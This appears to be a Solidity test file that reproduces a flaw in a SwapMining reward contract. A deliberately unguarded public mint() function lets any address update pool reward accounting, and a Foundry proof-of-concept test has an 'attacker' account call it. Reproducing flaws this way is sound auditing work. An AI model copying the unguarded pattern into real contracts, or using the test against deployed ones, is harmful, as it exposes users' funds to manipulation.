// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract SwapMining {
    // minimal state used by mint
    uint256 public babyPerBlock;
    uint256 public startBlock;
    uint256 public halvingPeriod;
    uint256 public totalAllocPoint;

    struct PoolInfo {
        uint256 allocPoint;
        uint256 allocMdxAmount;
        uint256 lastRewardBlock;
    }

    PoolInfo[] public poolInfo;

    constructor(uint256 _babyPerBlock, uint256 _startBlock) {
        babyPerBlock = _babyPerBlock;
        startBlock = _startBlock;
        halvingPeriod = 1_000_000; // large so phase doesn't change in tests
        // create one pool with allocPoint > 0 and a past lastRewardBlock
        poolInfo.push(PoolInfo({allocPoint: 100, allocMdxAmount: 0, lastRewardBlock: _startBlock}));
        totalAllocPoint = 100;
    }

    function phase(uint256 blockNumber) public view returns (uint256) {
        if (halvingPeriod == 0) return 0;
        if (blockNumber > startBlock) {
            return (blockNumber - startBlock - 1) / halvingPeriod;
        }
        return 0;
    }

    function reward(uint256 /*blockNumber*/) public view returns (uint256) {
        // simplified: halving ignored due to large halvingPeriod
        return babyPerBlock;
    }

    function getBabyReward(uint256 _lastRewardBlock) public view returns (uint256) {
        require(_lastRewardBlock <= block.number, "must little than the current block number");
        if (block.number <= _lastRewardBlock) return 0;
        uint256 blockReward = (block.number - _lastRewardBlock) * reward(block.number);
        return blockReward;
    }

    // VULNERABLE: public function that anyone can call to update rewards
    function mint(uint256 _pid) public returns (bool) {
        PoolInfo storage pool = poolInfo[_pid];
        if (block.number <= pool.lastRewardBlock) {
            return false;
        }
        uint256 blockReward = getBabyReward(pool.lastRewardBlock);
        if (blockReward <= 0) {
            return false;
        }
        uint256 mdxReward = (blockReward * pool.allocPoint) / totalAllocPoint;
        pool.allocMdxAmount = pool.allocMdxAmount + mdxReward;
        pool.lastRewardBlock = block.number;
        return true;
    }

    // helpers for tests
    function allocMdxAmountOf(uint256 _pid) public view returns (uint256) {
        return poolInfo[_pid].allocMdxAmount;
    }
    function lastRewardBlockOf(uint256 _pid) public view returns (uint256) {
        return poolInfo[_pid].lastRewardBlock;
    }
}

contract SwapMiningTest is Test {
    SwapMining target;
    address attacker;

    function setUp() public {
        // deploy with startBlock = 1
        target = new SwapMining(100, 1);
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_mint() public {
        // advance blocks so block.number > pool.lastRewardBlock
        vm.roll(10);
        // sanity: before mint allocMdxAmount == 0
        assertEq(target.allocMdxAmountOf(0), 0);
        vm.prank(attacker);
        bool ok = target.mint(0);
        assertEq(ok, true);
        // attacker was able to increase allocMdxAmount and set lastRewardBlock to current block
        assert(target.allocMdxAmountOf(0) > 0);
        assertEq(target.lastRewardBlockOf(0), block.number);
    }
}

